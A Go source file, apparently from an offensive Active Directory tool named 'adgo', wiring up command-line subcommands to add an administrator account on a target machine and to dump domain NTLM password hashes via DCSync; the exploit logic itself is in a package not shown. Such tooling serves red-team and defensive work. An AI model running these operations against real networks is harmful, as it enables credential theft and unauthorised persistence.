// cmd/adgo/commands/persistence.go
package commands

import (
	"fmt"

	"adgo/pkg/common"
	"adgo/pkg/exploits"

	"github.com/spf13/cobra"
)

// AddAdminUserCmd ajoute un utilisateur administrateur.
var AddAdminUserCmd = &cobra.Command{
	Use:   "add-admin-user",
	Short: "Add an Administrator user",
	RunE: func(cmd *cobra.Command, args []string) error {
		target, _ := cmd.Flags().GetString("target")
		username, _ := cmd.Flags().GetString("username")
		password, _ := cmd.Flags().GetString("password")

		err := exploits.AddAdminUser(target, username, password)
		if err != nil {
			common.PrintError(fmt.Errorf("failed to add admin user: %v", err))
			return err
		}

		common.PrintSuccess(fmt.Sprintf("User %s added successfully as Administrator", username))
		return nil
	},
}

// DumpNTLMHashesCmd dump les hashs NTLM avec DCSync.
var DumpNTLMHashesCmd = &cobra.Command{
	Use:   "dump-ntlm",
	Short: "Dump NTLM hashes using DCSync",
	RunE: func(cmd *cobra.Command, args []string) error {
		dcIP, _ := cmd.Flags().GetString("dc-ip")
		username, _ := cmd.Flags().GetString("username")
		password, _ := cmd.Flags().GetString("password")

		hashes, err := exploits.DumpNTLMHashesWithDCSync(dcIP, username, password)
		if err != nil {
			common.PrintError(fmt.Errorf("failed to dump NTLM hashes: %v", err))
			return err
		}

		for _, hash := range hashes {
			fmt.Printf("User: %s, Hash: %s\n", hash.SAMAccountName, hash.NTLMHash)
		}

		common.PrintSuccess("NTLM hashes dumped successfully")
		return nil
	},
}

func init() {
	AddAdminUserCmd.Flags().String("target", "", "Target machine")
	AddAdminUserCmd.Flags().String("username", "", "Username for new admin user")
	AddAdminUserCmd.Flags().String("password", "", "Password for new admin user")

	DumpNTLMHashesCmd.Flags().String("dc-ip", "", "IP address of the Domain Controller")
	DumpNTLMHashesCmd.Flags().String("username", "", "Username for DCSync")
	DumpNTLMHashesCmd.Flags().String("password", "", "Password for DCSync")

	PersistenceCmd.AddCommand(AddAdminUserCmd)
	PersistenceCmd.AddCommand(DumpNTLMHashesCmd)
}

// PersistenceCmd est la commande racine pour les opérations de persistance.
var PersistenceCmd = &cobra.Command{
	Use:   "persistence",
	Short: "Persistence operations",
}
